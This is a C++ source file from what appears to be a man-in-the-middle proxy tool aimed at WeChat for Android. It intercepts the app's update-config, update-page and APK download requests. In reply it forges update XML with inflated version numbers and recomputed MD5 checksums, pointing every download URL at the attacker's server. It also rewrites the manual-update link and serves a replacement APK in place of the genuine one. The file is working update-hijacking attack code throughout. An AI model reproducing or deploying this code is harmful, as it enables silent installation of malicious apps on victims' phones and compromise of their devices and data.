

#include "WeixinAndroid.h"
#include "../cipher/CryptoUtils.h"
#include "sslPublic.h"
#include "../HttpUtils.h"
#include "PluginServer.h"

#include "../attacker.h"
#include "../FileOper.h"
#include "../version.h"
#include "../HttpUtils.h"

//ÎÄ¼þmd5¼ÆËãwebsite
//http://www.atool.org/file_hash.php	

//res.servicewechat.com/weapp/public/commlib/266.wxapkg

//https://dldir1.qq.com/weixin/android/wxweb/updateConfig.xml

int WeixinAndroid::isWxAndroidUpdateConfig(const char * url,const char * szdn) {

	if (strstr(szdn, "dldir1.qq.com") ) {
		if (strstr(url, "/weixin/android/wxweb/updateConfig.xml"))
		{
			return TRUE;
		}
		else if (strstr(url, "pluginUpdateConfig"))
		{
			//return TRUE;
		}
	}

	return FALSE;
}



int WeixinAndroid::isWxAndroidUpdateApkJs(const char* url, const char * szdn) {
	if (strstr(szdn, "weixin.qq.com") <= 0) {
		return FALSE;
	}

	char * qqurl = "GET /cgi-bin/readtemplate?t=page/faq/android/";			
	//GET /cgi-bin/readtemplate?t=page/faq/android/667/h5&lang=zh_CN&tt=intro_newversion&version=637929270
	if (strstr(url, qqurl) )
	{
		return TRUE;
	}

	return FALSE;
}

int WeixinAndroid::isWxAndroidRequestApk(const char * url, const char * szdn) {

	if (strstr(szdn, "dldir1.qq.com") <= 0) {
		return FALSE;
	}
	
	char * wxurl = "/weixin/android/weixin_0x";			//weixin_0x26060736_1321.apk 6.6.7
	if (strstr(url, wxurl) && strstr(url,".apk") )
	{
		return TRUE;
	}

	return FALSE;
}


int WeixinAndroid::isWxAndroidRequestWebApk(const char * url, const char * szdn) {

	if (strstr(szdn, "dldir1.qq.com") <= 0) {
		return FALSE;
	}
/*
ssl first packet:GET /weixin/android/weixin706android1460.apk HTTP/1.1
Host: dldir1.qq.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 6.0; ZTE BV0701 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044807 Mobile Safari/537.36 MMWEBID/9983 MicroMessenger/7.0.1380(0x2700003D) Process/tools NetType/WIFI Language/zh_CN
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/wxpic,image/sharpp,image/apng,image/tpg,*//*;q=0.8
Referer: https://weixin.qq.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,en-US;q=0.9
Q-UA2: QV=3&PL=ADR&PR=WX&PP=com.tencent.mm&PPVN=7.0.0&TBSVC=43620&CO=BK&COVC=044807&PB=GE&VE=GA&DE=PHONE&CHID=0&LCID=9422&MO= ZTEBV0701 &RL=1080*1920&OS=6.0&API=23
Q-GUID: 0bfcebdee1098efabe9e26c613b788cb
Q-Auth: 31045b957cf33acf31e40be2f3e71c5217597676a9729f1b
*/
//GET /weixin/android/weixin673android1360.apk HTTP/1.1

	char * wxurl = "/weixin/android/weixin";			
	if (strstr(url, wxurl)  && strstr(url, ".apk") )
	{
		return TRUE;
	}

	return FALSE;
}


int WeixinAndroid::sendWxAndroidUpdateApk(const char * lpurl, const char * lpdn, const char * httphdr, LPSSLPROXYPARAM lpssl) {

	char szHttpRespHdrFormat[] =
		"HTTP/1.1 206 Partial Content\r\n"
		"Connection: close\r\n"
		"Content-Type: application/vnd.android.package-archive\r\n"
		"Content-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(lpssl->username, ANDROID_REPLACE_FILENAME);

	int ret = 0;
	string key = "Range";
	string value = HttpUtils::getValueFromKey((char*)httphdr, key);
	if (value != "")
	{
		string bytes = value.replace(value.find("bytes="), lstrlenA("bytes="), "");
		int pos = bytes.find("-");
		string start = bytes.substr(0, pos);
		string end = bytes.substr(pos + 1);
		int startno = atoi(start.c_str());
		int endno = atoi(end.c_str());
		ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpRespHdrFormat, startno, endno, 1);
	}
	else {
		key = "RANGE";
		string value = HttpUtils::getValueFromKey((char*)httphdr, key);
		if (value != "") {
			string bytes = value.replace(value.find("bytes="), lstrlenA("bytes="), "");
			int pos = bytes.find("-");
			string start = bytes.substr(0, pos);
			string end = bytes.substr(pos + 1);
			int startno = atoi(start.c_str());
			int endno = atoi(end.c_str());
			ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpRespHdrFormat, startno, endno, 1);
		}
		else {
			char * szHttpRespHdrAppFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/vnd.android.package-archive\r\nContent-Length: %u\r\n\r\n";
			ret = PluginServer::SendPluginFile(filename.c_str(), lpssl, szHttpRespHdrAppFormat, 1);
		}
	}

	return TRUE;
}


int WeixinAndroid::sendWxAndroidUpdateApk(const char * lpurl,const char * lpdn, const char * httphdr, LPHTTPPROXYPARAM lpparam) {

	char szHttpRespHdrFormat[] =
		"HTTP/1.1 206 Partial Content\r\n"
		"Connection: close\r\n"
		"Content-Type: application/vnd.android.package-archive\r\n"
		"Content-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(lpparam->username, ANDROID_REPLACE_FILENAME);

	int ret = 0;
	string key = "Range";
	string value = HttpUtils::getValueFromKey((char*)httphdr, key);
	if (value != "")
	{
		string bytes = value.replace(value.find("bytes="), lstrlenA("bytes="), "");
		int pos = bytes.find("-");
		string start = bytes.substr(0, pos);
		string end = bytes.substr(pos + 1);
		int startno = atoi(start.c_str());
		int endno = atoi(end.c_str());
		ret = PluginServer::SendPluginFile(filename.c_str(), lpparam, szHttpRespHdrFormat,startno, endno, 1);
	}
	else {
		key = "RANGE";
		string value = HttpUtils::getValueFromKey((char*)httphdr, key);
		if (value != "") {
			string bytes = value.replace(value.find("bytes="), lstrlenA("bytes="), "");
			int pos = bytes.find("-");
			string start = bytes.substr(0, pos);
			string end = bytes.substr(pos + 1);
			int startno = atoi(start.c_str());
			int endno = atoi(end.c_str());
			ret = PluginServer::SendPluginFile(filename.c_str(), lpparam, szHttpRespHdrFormat, startno, endno, 1);
		}
		else {
			char * szHttpRespHdrAppFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
			ret = PluginServer::SendPluginFile(filename.c_str(), lpparam, szHttpRespHdrAppFormat, 1);
		}
	}

	return TRUE;
}


int WeixinAndroid::makeWxAndroidUpdateApkJs(char*recvBuffer,int iCounter, int buflimit, LPSSLPROXYPARAM lpssl) {
	int ret = 0;
	string filename = Public::getUserPluginPath(lpssl->username) + WEIXIN_ANDROID_JS_UPDATE_FILENAME;

	int filesize = 0;
	char *lpdata = 0;
	ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret == FALSE)
	{
		return FALSE;
	}

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + lpssl->username;

	char szurl[MAX_PATH];
	int urllen = wsprintfA(szurl, "http://%s/%s", strip.c_str(), ANDROID_REPLACE_FILENAME);

	string jsformat = lpdata;
	delete[] lpdata;
	char szflag[] = "weixin://manual_update/";
	int pos = jsformat.find(szflag);
	if (pos != -1)
	{
		jsformat = jsformat.replace(pos, lstrlenA(szflag), szurl);
	}
	else {
		return FALSE;
	}

	//char szjsbuf[0x4000];
	//int jslen = sprintf_s(szjsbuf, 0x4000, lpdata, strip.c_str(), WEIXIN_APK_UPDATE_FILENAME);

	char szsendfmt[] = "HTTP/1.1 200 OK\r\n"
		"Content-Type: text/html; charset=utf-8\r\n"
		"Connection: close\r\n"
		"Content-Length: %u\r\n\r\n%s";
	int sendlen = sprintf_s(recvBuffer, buflimit,szsendfmt, jsformat.length(), jsformat.c_str());
	return sendlen;
}

#define CONFIG_VERSION								9999			//174

#define UPDATE_MAIN_VERSION							9999			//461
#define UPDATE_MAIN_PATCH_VERSION					9998			//461

#define UPDATE_SUB_VERSION							9998			//360
#define UPDATE_SUB_PATCH_VERSION					9997			//360

#define UPDATE_LAST_VERSION							9997			//27
#define WEIXIN_ANDROID_CONFIG_FILENAME		"updateConfig_format.xml"

int WeixinAndroid::makeWxAndroidUpdateConfig(char * lpbuffer, int datasize, int buflimit, string username) {
	int ret = 0;

	int mainVer = 9999;

	int subver1 = 9998;
	int subver2 = 9997;

	int secondVer = 9996;

	char szrespformat[] =
		"HTTP/1.1 200 OK\r\n"
		"Content-Type: application/xml\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * szxmlformat =
		"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\r\n"
		"<updateConfig xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" checkvalue=\"%s\" configVer=\"%u\">\r\n%s";

	char * szxmlbodyformat =
"<Versions>\r\n"
"<VersionInfo grayMax=\"10000\" grayMin=\"1\" useCdn=\"true\" useCellular=\"true\" md5=\"%s\" period=\"0\" apkMax=\"997\" apkMin=\"10\" version=\"%u\" sdkMin=\"19\" fullurl=\"http://%s/%s\">\r\n"
"<patches/>\r\n"
"<Description versionStr=\"1.0.%u\"/>\r\n"
"</VersionInfo>\r\n"
"<VersionInfo grayMax=\"10000\" grayMin=\"1\" useCdn=\"true\" md5=\"%s\" period=\"0\" version=\"%u\" sdkMin=\"19\" fullurl=\"http://%s/%s\">\r\n"
"<patches>\r\n"
"<Patch useCdn=\"true\" useCellular=\"true\" md5=\"%s\" url=\"http://%s/%s\" targetVersion=\"%u\"/>\r\n"
"<Patch useCdn=\"true\" useCellular=\"true\" md5=\"%s\" url=\"http://%s/%s\" targetVersion=\"%u\"/>\r\n"
"</patches>\r\n"
"<Description versionStr=\"1.0.%u\"/>\r\n"
"</VersionInfo>\r\n"
"<VersionInfo grayMax=\"10000\" grayMin=\"1\" useCdn=\"true\" md5=\"%s\" period=\"0\" version=\"%u\" sdkMin=\"190507\" fullurl=\"http://%s/%s\" runtimeAbis=\"arm64-v8a\">\r\n"
"<patches/>\r\n"
"<Description versionStr=\"1.0.%u\"/>\r\n"
"</VersionInfo>\r\n"
"</Versions>\r\n"
"<commands>\r\n"
"<command grayMax=\"10000\" grayMin=\"1\" sdkMin=\"190506\" module=\"tools\" opvalue=\"white_list_host_suffix:game.weixin.qq.com\" optype=\"executeCommand\"/>\r\n"
"<command grayMax=\"2000\" grayMin=\"1\" module=\"tools\" opvalue=\"fr_pptx:XWEB\" optype=\"executeCommand\"/>\r\n"
"<command grayMax=\"2000\" grayMin=\"1\" module=\"tools\" opvalue=\"fr_ppt:XWEB\" optype=\"executeCommand\"/>\r\n"
"<command grayMax=\"100\" grayMin=\"1\" sdkMin=\"190100\" module=\"tools,appbrand,toolsmp\" opvalue=\"10000\" optype=\"setTraceSampleRatioInTenThousand\"/>\r\n"
"<command grayMax=\"100\" grayMin=\"1\" sdkMin=\"190100\" module=\"tools,appbrand,toolsmp\" opvalue=\"xprofile.timing\" optype=\"setEnabledTraceCategory\"/>\r\n"
"<command grayMax=\"10000\" grayMin=\"1\" sdkMin=\"190100\" module=\"tools,toolsmp\" opvalue=\"enabletranlate:yes\" optype=\"executeCommand\"/>\r\n"
"<command grayMax=\"10\" grayMin=\"1\" sdkMin=\"190100\" module=\"appbrand,toolsmp\" opvalue=\"memorydump:true\" optype=\"executeCommand\"/>\r\n"
"<command grayMax=\"10000\" grayMin=\"1\" sdkMin=\"190100\" module=\"toolsmp\" opvalue=\"usenewdns:true\" optype=\"executeCommand\"/>\r\n"
"<command grayMax=\"10000\" grayMin=\"1\" sdkMin=\"190100\" module=\"tools\" opvalue=\"enable_check_dex:true\" optype=\"executeCommand\"/>\r\n"
"<command sdkMin=\"11\" module=\"mm\" opvalue=\"WV_KIND_X5\" optype=\"setwebtype\" sdkMax=\"22\"/>\r\n"
"<command grayMax=\"10000\" grayMin=\"1\" module=\"toolsmp\" opvalue=\"WV_KIND_CW\" optype=\"setwebtype\"/>\r\n"
"<command grayMax=\"10000\" grayMin=\"1\" sdkMin=\"11\" module=\"appbrand,support\" opvalue=\"WV_KIND_CW\" optype=\"setwebtype\"/>\r\n"
"<command grayMax=\"1000\" grayMin=\"1\" sdkMin=\"11\" module=\"tools\" opvalue=\"WV_KIND_CW\" optype=\"setwebtype\"/>\r\n"
"<command grayMax=\"9999\" grayMin=\"9700\" sdkMin=\"19\" module=\"tools\" opvalue=\"WV_KIND_SYS\" optype=\"setwebtype\" apiMin=\"24\"/>\r\n"
"</commands>\r\n"
"</updateConfig>";

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;

	string filename = Public::getUserPluginPath(username) + WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME;
	char szfilemd5[256] = { 0 };
	unsigned char hexmd5[256] = { 0 };
	ret = CryptoUtils::getUpdateFileMd5(filename, szfilemd5, hexmd5, FALSE);

	char szxmlbody[0x4000];
	int xmlbodysize = sprintf_s(szxmlbody, 0x4000, szxmlbodyformat,
		szfilemd5, mainVer, strip.c_str(), WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME,
		mainVer,

		szfilemd5, mainVer, strip.c_str(), WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME,

		szfilemd5, strip.c_str(), WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME,subver1,
		szfilemd5, strip.c_str(), WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME,subver2,
		
		mainVer,
		szfilemd5,secondVer,strip.c_str(),WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME, secondVer
		);

	char szxmlbodymd5[256] = { 0 };
	ret = CryptoUtils::getDataMd5(szxmlbody, xmlbodysize, szxmlbodymd5, FALSE);

	char szxml[0x4000];
	int xmlsize = sprintf_s(szxml, 0x4000, szxmlformat, szxmlbodymd5, CONFIG_VERSION, szxmlbody);

	int packsize = sprintf_s(lpbuffer, buflimit, szrespformat, xmlsize, szxml);

	//FileOper::fileWriter("wexinconfig.xml", lpbuffer, packsize);

	return packsize;
}

/*
GET /weixin/android/wxweb/updateConfig.xml HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: dldir1.qq.com
Connection: Keep-Alive
Accept-Encoding: gzip
*/



int WeixinAndroid::makeOldWxAndroidUpdateConfig(char * lpbuffer, int datasize, int buflimit, string username) {
	int ret = 0;

	char szrespformat[] =
		"HTTP/1.1 200 OK\r\n"
		"Content-Type: application/xml\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * szxmlformat =
		"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
		"<updateConfig xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" checkvalue=\"%s\" configVer=\"%u\">\r\n%s";

	char * szxmlbodyformat =
		"<Versions>\r\n"

		"<VersionInfo grayMax=\"10000\" grayMin=\"1\" useCdn=\"true\" md5=\"%s\" period=\"0\" version=\"%u\" sdkMin=\"19\" fullurl=\"http://%s/%s\">\r\n"
		"<patches>\r\n"
		"<Patch useCdn=\"true\" useCellular=\"true\" md5=\"%s\" targetVersion=\"%u\" url=\"http://%s/%s\"/>\r\n"
		"</patches>\r\n"
		"<Description versionStr=\"1.0.%u\"/>\r\n"
		"</VersionInfo>\r\n"

		"<VersionInfo grayMax=\"10000\" grayMin=\"1\" useCdn=\"true\" md5=\"%s\" period=\"0\" version=\"%u\" sdkMin=\"19\" fullurl=\"http://%s/%s\">\r\n"
		"<patches>\r\n"
		"<Patch useCdn=\"true\" useCellular=\"true\" md5=\"%s\" targetVersion=\"%u\" url=\"http://%s/%s\"/>\r\n"
		"</patches>\r\n"
		"<Description versionStr=\"1.0.%u\"/>\r\n"
		"</VersionInfo>\r\n"

		"<VersionInfo grayMin=\"1\" grayMax=\"10000\" sdkMin=\"19\" period=\"0\" md5=\"%s\" version=\"%u\" useCdn=\"true\" fullurl=\"http://%s/%s\">\r\n"
		"<patches/>\r\n"
		"<Description versionStr=\"1.0.%u\"/>\r\n"
		"</VersionInfo>\r\n"

		"</Versions>\r\n"
		"<commands>\r\n"
//      "<command sdkMin=\"190100\" optype=\"executeCommand\" grayMin=\"1\" grayMax=\"10000\" opvalue=\"memorydump:false\" module=\"appbrand,toolsmp\"/>\r\n"
// 		"<command sdkMin=\"190100\" optype=\"executeCommand\" grayMin=\"1\" grayMax=\"10000\" opvalue=\"usenewdns:false\" module=\"toolsmp\"/>\r\n"
// 		"<command sdkMin=\"190100\" optype=\"executeCommand\" grayMin=\"1\" grayMax=\"10000\" opvalue=\"enable_check_dex:false\" module=\"tools\"/>\r\n"
// 		"<command sdkMin=\"11\" sdkMax=\"22\" optype=\"setwebtype\" opvalue=\"WV_KIND_X5\" module=\"mm\"/>\r\n"
// 		"<command optype=\"setwebtype\" grayMin=\"1\" grayMax=\"5000\" opvalue=\"WV_KIND_CW\" module=\"toolsmp\"/>\r\n"
// 		"<command sdkMin=\"11\" optype=\"setwebtype\" grayMin=\"1\" grayMax=\"10000\" opvalue=\"WV_KIND_CW\" module=\"appbrand,support\"/>\r\n"
// 		"<command sdkMin=\"11\" optype=\"setwebtype\" grayMin=\"1\" grayMax=\"100\" opvalue=\"WV_KIND_CW\" module=\"tools\"/>\r\n"
// 		"<command sdkMin=\"19\" apiMin=\"24\" optype=\"setwebtype\" grayMin=\"9700\" grayMax=\"9999\" opvalue=\"WV_KIND_SYS\" module=\"tools\"/>\r\n"

		"<command grayMax=\"1000\" grayMin=\"1\" module=\"tools\" opvalue=\"fr_pptx:XWEB\" optype=\"executeCommand\"/>\r\n"
		"<command grayMax=\"1000\" grayMin=\"1\" module=\"tools\" opvalue=\"fr_ppt:XWEB\" optype=\"executeCommand\"/>\r\n"
		"<command grayMax=\"500\" grayMin=\"1\" sdkMin=\"190100\" module=\"tools\" opvalue=\"10000\" optype=\"setTraceSampleRatioInTenThousand\"/>\r\n"
		"<command grayMax=\"500\" grayMin=\"1\" sdkMin=\"190100\" module=\"tools\" opvalue=\"xprofile.timing\" optype=\"setEnabledTraceCategory\"/>\r\n"
		"<command grayMax=\"10000\" grayMin=\"1\" sdkMin=\"190100\" module=\"tools,toolsmp\" opvalue=\"enabletranlate:yes\" optype=\"executeCommand\"/>\r\n"
		"<command grayMax=\"10\" grayMin=\"1\" sdkMin=\"190100\" module=\"appbrand,toolsmp\" opvalue=\"memorydump:true\" optype=\"executeCommand\"/>\r\n"
		"<command grayMax=\"10000\" grayMin=\"1\" sdkMin=\"190100\" module=\"toolsmp\" opvalue=\"usenewdns:true\" optype=\"executeCommand\"/>\r\n"
		"<command grayMax=\"10000\" grayMin=\"1\" sdkMin=\"190100\" module=\"tools\" opvalue=\"enable_check_dex:true\" optype=\"executeCommand\"/>\r\n"
		"<command sdkMin=\"11\" module=\"mm\" opvalue=\"WV_KIND_X5\" optype=\"setwebtype\" sdkMax=\"22\"/>\r\n"
		"<command grayMax=\"10000\" grayMin=\"1\" module=\"toolsmp\" opvalue=\"WV_KIND_CW\" optype=\"setwebtype\"/>\r\n"
		"<command grayMax=\"10000\" grayMin=\"1\" sdkMin=\"11\" module=\"appbrand,support\" opvalue=\"WV_KIND_CW\" optype=\"setwebtype\"/>\r\n"
		"<command grayMax=\"1000\" grayMin=\"1\" sdkMin=\"11\" module=\"tools\" opvalue=\"WV_KIND_CW\" optype=\"setwebtype\"/>\r\n"
		"<command grayMax=\"9999\" grayMin=\"9700\" sdkMin=\"19\" module=\"tools\" opvalue=\"WV_KIND_SYS\" optype=\"setwebtype\" apiMin=\"24\"/>\r\n"
		"</commands>\r\n"
		"</updateConfig>";

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;

	string filename = Public::getUserPluginPath(username) + WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME;
	char szfilemd5[256] = { 0 };
	unsigned char hexmd5[256] = { 0 };
	ret = CryptoUtils::getUpdateFileMd5(filename, szfilemd5, hexmd5, FALSE);

	char szxmlbody[0x2000];
	int xmlbodysize = sprintf_s(szxmlbody, 0x2000, szxmlbodyformat,
		szfilemd5, UPDATE_MAIN_VERSION, strip.c_str(), WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME,
		szfilemd5, UPDATE_MAIN_PATCH_VERSION, strip.c_str(), WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME,
		UPDATE_MAIN_VERSION,

		szfilemd5, UPDATE_SUB_VERSION, strip.c_str(), WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME,
		szfilemd5, UPDATE_SUB_PATCH_VERSION, strip.c_str(), WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME,
		UPDATE_SUB_VERSION,

		szfilemd5, UPDATE_LAST_VERSION, strip.c_str(), WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME,
		UPDATE_LAST_VERSION);

	char szxmlbodymd5[256] = { 0 };
	ret = CryptoUtils::getDataMd5(szxmlbody, xmlbodysize, szxmlbodymd5, FALSE);

	char szxml[0x2000];
	int xmlsize = sprintf_s(szxml, 0x2000, szxmlformat, szxmlbodymd5, CONFIG_VERSION, szxmlbody);

	int packsize = sprintf_s(lpbuffer, buflimit, szrespformat, xmlsize, szxml);

	//FileOper::fileWriter("wexinconfig.xml", lpbuffer, packsize);

	return packsize;
}

int WeixinAndroid::makeOldOldWxAndroidUpdateConfig(char * lpbuffer, int datasize,int buflimit, string username) {

	int ret = 0;

	char szrespformat[] =
		"HTTP/1.1 200 OK\r\n"
		"Content-Type: application/xml\r\n"
		"Content-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * szxmlformat =
		"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
		"<updateConfig xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" checkvalue=\"%s\" configVer=\"%u\">\r\n%s";

	char * szxmlbodyformat =
		"<Versions>\r\n"
		"<VersionInfo grayMax=\"10000\" grayMin=\"1\" useCdn=\"true\" md5=\"%s\" period=\"0\" version=\"%u\" sdkMin=\"1\" fullurl=\"http://%s/%s\">\r\n"
		"<patches/>\r\n"
		"<Description versionStr=\"1.0.%u\"/>\r\n"
		"</VersionInfo>\r\n"
		"</Versions>\r\n"
		"<commands>\r\n"
		"<command sdkMin=\"11\" sdkMax=\"22\" optype=\"setwebtype\" opvalue=\"WV_KIND_X5\" module=\"mm\"/>\r\n"
		"<command grayMin=\"1\" grayMax=\"10000\" optype=\"setwebtype\" opvalue=\"WV_KIND_CW\" module=\"toolsmp\"/>\r\n"
		"<command sdkMin=\"11\" optype=\"setwebtype\" grayMin=\"1\" grayMax=\"10000\" opvalue=\"WV_KIND_CW\" module=\"appbrand,support\"/>\r\n"
		"<command sdkMin=\"11\" optype=\"setwebtype\" grayMin=\"1\" grayMax=\"10000\" opvalue=\"WV_KIND_CW\" module=\"tools\"/>\r\n"
		"<command sdkMin=\"19\" apiMin=\"24\" optype=\"setwebtype\" grayMin=\"1\" grayMax=\"10000\" opvalue=\"WV_KIND_SYS\" module=\"tools\"/>\r\n"
		"</commands>\r\n"
		"</updateConfig>";

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + username;

	string filename = Public::getUserPluginPath(username) + WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME;
	char szfilemd5[256] = { 0 };
	unsigned char hexmd5[256] = { 0 };
	ret = CryptoUtils::getUpdateFileMd5(filename, szfilemd5, hexmd5, FALSE);

	char szxmlbody[0x2000];
	int xmlbodysize = sprintf_s(szxmlbody, 0x2000, szxmlbodyformat,
		szfilemd5, UPDATE_MAIN_VERSION, strip.c_str(), WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME,
		UPDATE_MAIN_VERSION);

	char szxmlbodymd5[256] = { 0 };
	ret = CryptoUtils::getDataMd5(szxmlbody, xmlbodysize, szxmlbodymd5, FALSE);

	char szxml[0x2000];
	int xmlsize = sprintf_s(szxml, 0x2000, szxmlformat, szxmlbodymd5, CONFIG_VERSION, szxmlbody);

	int packsize = sprintf_s(lpbuffer, buflimit, szrespformat, xmlsize, szxml);

	FileOper::fileWriter("wexinconfig.xml", lpbuffer, packsize);

	return packsize;
	
}